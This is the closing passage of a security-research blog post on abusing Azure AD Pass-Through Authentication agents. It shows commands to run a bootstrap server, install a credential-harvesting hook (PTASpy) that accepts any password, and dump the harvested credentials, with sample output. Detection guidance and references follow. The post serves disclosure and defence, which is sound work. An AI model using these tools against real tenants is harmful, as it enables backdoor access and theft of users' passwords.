<span class="p">.\</span><span class="nb">Start-HttpServer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Thumbprint</span> <span class="s2">&quot;78D2B492C672D904CF2B5579659AC397E6D65F38&quot;</span> <span class="n">-FileToServe</span> <span class="p">.\</span><span class="n">bootstrap</span><span class="p">.</span><span class="n">xml</span> <span class="n">-ContentType</span> <span class="s2">&quot;text/xml&quot;</span> <span class="n">-Verbose</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>VERBOSE: Removing existing SSL bindings
VERBOSE: Binding 78D2B492C672D904CF2B5579659AC397E6D65F38 to 0.0.0.0:443
Listening https://*:443/
To exit, browse to: https://*:443/exit
</code></pre>

<h3 id="install-ptaspy-ps1">Install-PTASpy.ps1</h3>

<p>After the computer or PTA agent is restarted, PTASpy must be installed again.</p>

<p><strong>To install PTASpy:</strong></p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Install PTASpy</span>
<span class="p">.\</span><span class="nb">Install-PTASpy</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to start...
Installation successfully completed!
All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
</code></pre>

<h3 id="dump-credentials-ps1">Dump-Credentials.ps1</h3>

<p>This script is used to dump the harvested credentials. Basically, it just shows the content of C:\PTASpy\PTASpy.csv file, where PTASpy stores the harvested credentials.</p>

<p><strong>To start credential dumping:</strong></p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Start credential dumping</span>
<span class="p">.\</span><span class="n">Dump-Credentials</span><span class="p">.</span><span class="n">ps1</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>Timestamp           Username                      Password
---------           --------                      --------
2022-09-19T11:21:37 AlexW@company.com             Fall2022!
2022-09-19T11:21:51 AllanD@company.com            Hello World!
</code></pre>

<h1 id="detecting">Detecting</h1>

<p>I got a response from Microsoft on Sep 20 2022, that gives us a bit more hope on detecting the malicious PTA activity in the future:</p>

<blockquote>
<p>This technique requires the actor to have already gained administrative access on a target machine. For best protection, we recommend customers follow hardening guidance found here: <a href="https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-install-prerequisites#harden-your-azure-ad-connect-server" target="_blank">Azure AD Connect: Prerequisites and hardware - Microsoft Entra | Microsoft Docs</a>.
In addition, organizations should complement hardening strategies and <strong>monitor for access to on-prem Crypto API (CAPI) keys and Key file operations</strong> as well
as <strong>discrepancies between on-prem AD and Azure AD interactive sign-in logs in relation to Pass-Through Authentication (PTA) logon events</strong>.
We’re constantly looking at new ways to protect against similar attacks and are <strong>working on a few enrichments to the current Azure AD logging to help identify any potential ongoing impersonation of a PTA agent</strong></p>
</blockquote>

<h2 id="monitoring-pta-agent-certificate-export">Monitoring PTA agent certificate export</h2>

<p>There are no PTA specific events to monitor.
However, a general hunting strategy proposed by Roberto Rodriquez (<a href="https://twitter.com/Cyb3rWard0g" target="_blank">@Cyb3rWard0g</a>)
to monitor suspicious access to CAPI keys will catch also PTA certificate exports (click to enlarge):</p>

<p><a href="/images/posts/pta_07.jpg" target="_blank">
<img src="/images/posts/pta_07.jpg" alt="monitoring CAPI" />
</a></p>

<p><strong>Note:</strong> As mentioned earlier, and in the step 8. of the PTA <a href="https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-security-deep-dive#operational-security-of-the-authentication-agents" target="_blank">documentation</a>, the location of PTA certificate and keys changes when the certicate is renewed for the first time 5-6 months after the installation.</p>

<h2 id="monitoring-pta-agents">Monitoring PTA agents</h2>

<p>Administrators can check the status of PTA agents in Azure AD Portal <a href="https://portal.azure.com/#view/Microsoft_AAD_IAM/PTAAgentManagement.ReactView" target="_blank">here</a>.</p>

<p>The list of PTA agents used in my test tenant looks as follows:
<img src="/images/posts/pta_06.png" alt="PTA Agents" /></p>

<p><strong>To view agents using AADInternals:</strong></p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># List all proxy agents</span>
<span class="nb">Get-AADIntProxyAgents</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>id                       : 672843e0-8b25-434f-93e2-5d5071139e09
machineName              : XXX-DC.XXXXXXXXX.XXX
externalIp               : 20.XXX.XXX.XXX
status                   : active
supportedPublishingTypes : {authentication}
</code></pre>

<p>You can use both methods to monitor and verify the behaviour: The IP address of the PTA does NOT change.</p>

<p>However, based on the latest response from Microsoft, they are working on adding more details for PTA related sign-ins log events.
This would help administrators to detect if authentication is performed by a compromised PTA agent.</p>

<h2 id="monitoring-sign-in-discrepancies">Monitoring sign-in discrepancies</h2>

<p>AFAIK, in theory, the only existing way to detect exploitation of PTA vulnerabilities is to monitor discrepancies between on-prem AD and Azure AD sign-in events.
The logic is simple: If there is PTA related sign-in event in Azure AD that has no corresponding event in on-prem AD, the event is likely
result of exploiting PTA vulnerabilities.</p>

<p>However, there are no information that could be used to correlate sign-in events between on-prem AD and Azure AD, which makes monitoring prone to false positives.</p>

<h1 id="summary">Summary</h1>

<p>In this blog, I provided scripts to demonstrate how a certificate of a compromised PTA agent can be used:</p>

<ul>
<li>As a backdoor</li>
<li>To harvest credentials</li>
</ul>

<p>Moreover, I demonstrated that the IP address of the PTA agent doesn&rsquo;t change when existing bootstrap was used.
As such, attacks exploiting PTA agent certificates can&rsquo;t be currently detected.</p>

<h1 id="credits-references">Credits &amp; References</h1>

<ul>
<li>Secureworks: <a href="https://www.secureworks.com/research/azure-active-directory-pass-through-authentication-flaws" target="_blank">Azure Active Directory Pass-Through Authentication Flaws</a></li>
<li>Adam Chester (<a href="https://twitter.com/_xpn_" target="_blank">@&#95;xpn_</a>): <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/" target="_blank">Azure AD Connect for Red Teamers</a></li>
<li>WiX: <a href="https://wixtoolset.org/" target="_blank">WiX Toolset</a></li>
<li>Microsoft: <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener" target="_blank">HttpListener Class</a></li>
<li>Microsoft: <a href="https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-install-prerequisites#harden-your-azure-ad-connect-server" target="_blank">Azure AD Connect: Prerequisites and hardware - Microsoft Entra | Microsoft Docs</a></li>
<li>Microsoft: <a href="https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-security-deep-dive#operational-security-of-the-authentication-agents" target="_blank">Operational security of the Authentication Agents</a></li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/pta/" rel="tag">PTA</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/abusing/" rel="tag">Abusing</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/backdoor/" rel="tag">Backdoor</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2fpost%2fpta%2f&text=Exploiting%20Azure%20AD%20PTA%20vulnerabilities%3a%20Creating%20backdoor%20and%20harvesting%20credentials&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2fpost%2fpta%2f&mini=true&title=Exploiting%20Azure%20AD%20PTA%20vulnerabilities%3a%20Creating%20backdoor%20and%20harvesting%20credentials&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Principal Identity Security Researcher at Microsoft Security Research. <br> Before his security researcher career, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Entra ID (Azure AD) security. <br><br>Before joining Microsoft, Dr Syynimaa was Microsoft MVP in security category and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/gmsa/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Hunt for the gMSA secrets</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/ests/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Bypassing Azure AD home tenant MFA and CA</p></a>
	</div>
</nav>

	
</main>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
